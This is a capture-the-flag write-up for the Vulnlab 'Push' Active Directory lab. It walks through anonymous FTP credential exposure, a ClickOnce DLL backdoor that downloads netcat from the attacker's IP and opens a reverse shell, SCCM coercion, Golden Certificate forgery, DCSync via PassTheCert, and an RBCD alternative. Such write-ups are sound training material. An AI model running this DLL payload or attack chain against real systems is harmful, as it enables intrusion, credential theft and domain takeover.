# Vulnlab - Push

## NMAP

### MS01.push.vl

```
PORT      STATE SERVICE       VERSION
21/tcp    open  ftp           Microsoft ftpd
| ftp-syst: 
|_  SYST: Windows_NT                          
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| 08-03-23  08:49PM       <DIR>          .config
| 08-03-23  08:49PM       <DIR>          .git
|_08-03-23  08:49PM       <DIR>          dev
80/tcp    open  http          Microsoft IIS httpd 10.0
| http-methods:        
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: SelfService
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds?
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
|_ssl-date: 2023-10-12T09:36:17+00:00; 0s from scanner time.
| rdp-ntlm-info:   
|   Target_Name: PUSH                       
|   NetBIOS_Domain_Name: PUSH          
|   NetBIOS_Computer_Name: MS01             
|   DNS_Domain_Name: push.vl
|   DNS_Computer_Name: MS01.push.vl
|   DNS_Tree_Name: push.vl     
Host script results:
| smb2-security-mode: 
|   311: 
|_    Message signing enabled but not required
| smb2-time: 
5985/tcp open  http    Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
```
### DC01.push.vl

```
PORT      STATE SERVICE       VERSION       
53/tcp    open  domain        Simple DNS Plus
80/tcp    open  http          Microsoft IIS httpd 10.0
| http-methods:                             
|   Supported Methods: OPTIONS TRACE GET HEAD POST           
|_  Potentially risky methods: TRACE                   
|_http-server-header: Microsoft-IIS/10.0
|_http-title: IIS Windows Server
88/tcp open  kerberos-sec Microsoft Windows Kerberos (server time: 2023-10-12 09:45:12Z)
135/tcp   open  msrpc         Microsoft Windows
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: push.vl0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC01.push.vl
| Subject Alternative Name: DNS:DC01.push.vl          
| Issuer: commonName=DC01.push.vl
443/tcp   open  ssl/https                          
|_ssl-date: TLS randomness does not represent time
|_http-title: IIS Windows Server                        
|_http-server-header: Microsoft-IIS/10.0      
| ssl-cert: Subject: commonName=DC01.push.vl
445/tcp   open  microsoft-ds?                         
464/tcp   open  kpasswd5?
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
| rdp-ntlm-info: 
|   Target_Name: PUSH
|   NetBIOS_Domain_Name: PUSH
|   NetBIOS_Computer_Name: DC01
|   DNS_Domain_Name: push.vl
|   DNS_Computer_Name: DC01.push.vl
|   DNS_Tree_Name: push.vl
|   Product_Version: 10.0.20348
|_  System_Time: 2023-10-12T09:35:36+00:00
| ssl-cert: Subject: commonName=DC01.push.vl
| Issuer: commonName=DC01.push.vl
9389/tcp  open  mc-nmf        .NET Message Framing
49667/tcp open  msrpc         Microsoft Windows RPC
61236/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
61265/tcp open  msrpc         Microsoft Windows RPC
```

# Enumerating MS01

## PORT 21 (FTP)

Having FTP enabled on MS01 with anonymous login we can enumerate the available directories

<img src="https://i.imgur.com/kQegHeQ.png"/>

But all these directories were empty as there wasn't any files there

<img src="https://i.imgur.com/YLIIDdq.png"/>
Checking for hidden files we can find `.git-credentials` file

<img src="https://i.imgur.com/VV4axZZ.png"/>

<img src="https://i.imgur.com/YNdcP7W.png"/>|
## PORT 80 

Accessing the web server, we'll find SelfService which allows us to download `setup.exe` and `SeflService.application`

<img src="https://i.imgur.com/YgBKfab.png"/>

<img src="https://i.imgur.com/qXjr8Je.png"/>

Since it requires to work with windows in order to install the setup, I skipped this part and moved on to enumerating smb with the credentials we have
## PORT 445 (SMB)

Using credentials on MS01, we can enumerate the shares where we'll find `wwwroot` share from the self service application is being hosted

<img src="https://i.imgur.com/LTlozm0.png"/>
<img src="https://i.imgur.com/QMDb2pn.png"/>

Going into `Application Files` there are SelfService files

<img src="https://i.imgur.com/ySn0oYQ.png"/>
# Abusing ClickOnce to gain foothold

This share is named as `ClickOnce application dev share` which is an easy  deployment and execute technique based on user interaction,  we did saw `last-run.txt` which is indicating that this selfservice is being executed after some time by the user

<img src="https://i.imgur.com/cn4I5z8.png"/>
<img src="https://i.imgur.com/ay8M2fR.png"/>

To abuse clickonce following this arcticle https://infosecwriteups.com/backdooring-clickonce-net-for-initial-access-a-practical-example-1eb6863c0579, we  need to replace the dll with our custom dll to gain a reverse shell, so crafting a dll which will download and execute netcat on the victim machine

```c++
#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
    switch(dwReason){
        case DLL_PROCESS_ATTACH:
 
            system("curl 10.8.0.136/nc64.exe -o C:\\Windows\\Temp\\nc64.exe");
            system("C:\\Windows\\Temp\\nc64.exe 10.8.0.136 2222 -e cmd.exe");
 
            break;
        case DLL_PROCESS_DETACH:
            break;
        case DLL_THREAD_ATTACH:
            break;
        case DLL_THREAD_DETACH:
            break;
    }
    return TRUE;
}

```

<img src="https://i.imgur.com/N8cfbiz.png"/>

Now calculating validation digest hash and including it in `SelfService.dll.manifest` file also updating the size of the dll file

```bash
openssl dgst -binary -sha256 \                    
    SelfService.dll.deploy | \
openssl enc -base64
```

<img src="https://i.imgur.com/sYa4fKF.png"/>

<img src="https://i.imgur.com/eCioXsG.png"/>

Also change the value of `publicKeyToken` in `asmv1:assemblyIdentity` to `0000000000000000`

<img src="https://i.imgur.com/wdROLLI.png"/>

We also need to edit DigestValue and size of `SelfService.dll.manifest`in  `SelfService.Application` file and zeroing publicKeyToken

```bash
openssl dgst -binary -sha256 SelfService.dll.manifest | openssl enc -base64
```

<img src="https://i.imgur.com/UIrDqmB.png"/>
<img src="https://i.imgur.com/DGZsKFt.png"/>

Uploading dll, manifest and application file

<img src="https://i.imgur.com/VczqWqG.png"/>
<img src="https://i.imgur.com/KBGgK4E.png"/>

After a minute we'll see a hit on our python server and get a reverse shell  as `kelly.hill` on netcat listener 

<img src="https://i.imgur.com/xZR7YJy.png"/>
<img src="https://i.imgur.com/QTz4hPF.png"/>

From kelly's desktop folder, we'll also get her password

<img src="https://i.imgur.com/xOyhDBq.png"/>

Having a look at the logged in users on MS01, there's a directory for `sccadmin` which means that on this domain there's SCCM configured which requires to have an agent installed on domain computer for managing and deploying applications

<img src="https://i.imgur.com/ZoqPVAF.png"/>

We can verify if this domain has a sccm configured

<img src="https://i.imgur.com/OVZosi9.png"/>

Enumerating the domain with `python-bloodhound`

```bash
python3 /opt/BloodHound.py/bloodhound.py -d 'push.vl' -u 'olivia.wood' -p 'DeployTrust07' -c all -ns 10.10.203.229
```

<img src="https://i.imgur.com/O0OHgv7.png"/>

Here we only have sccadmin in serveradmins group which doesn't have any interesting permissions over other objects

<img src="https://i.imgur.com/dUOUw0g.png"/>

## SCCM Coercion

With SharpSCCM https://github.com/Mayyhem/SharpSCCM we can cause an authentication coercion by Client Push Installation by obtaining NTLMv2 challenge response of the user which is running SCCM with local admin privilege on the system, capturing it through responder

```bash
SharpSCCM.exe invoke client-push -t 10.8.0.136
```

<img src="https://i.imgur.com/mCTt84u.png"/>

<img src="https://i.imgur.com/xeJ4jCp.png"/>
<img src="https://i.imgur.com/Y5sZTRf.png"/>
<img src="https://i.imgur.com/Hgthjgm.png"/>

## Escalating Privileges through Golden Certificate

But sccadmin doesn't have any ACLs as we saw from bloodhound, so the only thing left here is to enumerate ADCS, running `certuil` on MS01 to enumerate CA (Certificate Authority) server

<img src="https://i.imgur.com/Zf6SJZF.png"/>

So we basically have admin access on CA server which means we can extract the CA certificate and private key, with that forging a certificate for domain admin through which we can obtain the NTHash or TGT of domain admin, this is known as Golden Certificate attack.

Using `certipy` we can take backup of CA certificate and private key

```bash
certipy ca -u sccadmin -p '7ujm&UJM' -target-ip MS01.push.vl -backup
```

<img src="https://i.imgur.com/R4fz8eL.png"/>

With the certificate and private key obtained, forging domain admin's certificate

```bash
certipy forge -ca-pfx CA.pfx -upn administrator@push.vl -subject 'CN=Administrator,CN=Users,DC=PUSH,DC=VL'
```

<img src="https://i.imgur.com/fmv5R6Q.png"/>

But when trying to request TGT/NTHash we'll face an error, `KDC_ERROR_CLIENT_NOT_TRUSTED (Reserved for PKINIT)` 

<img src="https://i.imgur.com/UTBPrm2.png"/>

Which is an indication that DC does not support the PKINIT authentication which is a pre-authentication allowing to retrieve either TGT or NTHash, having a read on this article, it's still possible to abuse this since we have the administrator's certificate we can do the following attacks https://offsec.almond.consulting/authenticating-with-certificates-when-pkinit-is-not-supported.html?ref=7ms.us

- Add our created machine account to DC's `msDS-AllowedToActOnBehalfOfOtherIdentity` property to perform resource based delegation `RCBD`
- Modify account's password
- Granting the low privileged user DCSync rights

This can be achieved with PassTheCert script https://github.com/AlmondOffSec/PassTheCert/tree/main/Python ,I'll be going with granting DCsync rights to kelly.hill but first we need to extract the key and cert from pfx file 

```bash
certipy cert -pfx administrator_forged.pfx -nokey -out administrator.crt

certipy cert -pfx administrator_forged.pfx -nocert -out administrator.key
```

<img src="https://i.imgur.com/5IBsavd.png"/>

```bash
python3 /opt/PKINITtools/PassTheCert.py -action modify_user -crt administrator.crt -key administrator.key -target kelly.hill -elevate -domain push.vl -dc-host dc01.push.vl
```

<img src="https://i.imgur.com/zWQydWM.png"/>

Now we can run secretsdump.py with kelly.hill

<img src="https://i.imgur.com/FrbEUes.png"/>
<img src="https://i.imgur.com/HFDe3hp.png"/>
# Un-Intended Way through Resource Based Delegation (RBCD)

From bloodhound we can see kelly has `AllExtendedRights` and `WriteAccountRestrictions` on MS01, which means that we can read all properties on MS01 and we can edit `msDS-AllowedToActOnBehalfOfOtherIdentity` to perform RBCD (Resource based constrained delegation) by having write account restrictions rights

<img src="https://i.imgur.com/0J5mHlg.png"/>

First check if there's machine quota available to us in order to create a computer object

<img src="https://i.imgur.com/VMeMGoW.png"/>

Adding computer object with `addcomputer` from impacket

```bash
addcomputer.py -dc-ip 10.10.233.101 -computer-pass TestPassword321 -computer-name UwU push.vl/kelly.hill:'ShinraTensei!'
```

<img src="https://i.imgur.com/X6mArpb.png"/>
And now adding our created machine account in msDS-AllowedToActOnBehalfOfOtherIdentity property of MS01 to impersonate users on that machine

```bash
rbcd.py -action write -delegate-to "MS01$" -delegate-from "UwU$" -dc-ip 10.10.233.101 push.vl/kelly.hill:'ShinraTensei!'
```

<img src="https://i.imgur.com/cKWHsRr.png"/>

Impersonating as a local admin on MS01 by creating a ticket with `getST`

```bash
impacket-getST -spn 'cifs/MS01.push.vl' -impersonate administrator -dc-ip 10.10.233.101 'push.vl'/'UwU$':TestPassword321
```

<img src="https://i.imgur.com/tf4SQdO.png"/>

<img src="https://i.imgur.com/FDB2gRH.png"/>

We can completely skip the SCCM step and perform golden certificate attack from here.

- https://infosecwriteups.com/backdooring-clickonce-net-for-initial-access-a-practical-example-1eb6863c0579
- https://www.thehacker.recipes/a-d/movement/sccm-mecm
- https://posts.specterops.io/coercing-ntlm-authentication-from-sccm-e6e23ea8260a
- https://github.com/Mayyhem/SharpSCCM
- https://offsec.almond.consulting/authenticating-with-certificates-when-pkinit-is-not-supported.html?ref=7ms.us
- https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/ad-certificates/domain-persistence
- https://github.com/AlmondOffSec/PassTheCert/tree/main/Python
- https://www.hackingarticles.in/domain-persistence-golden-certificate-attack/
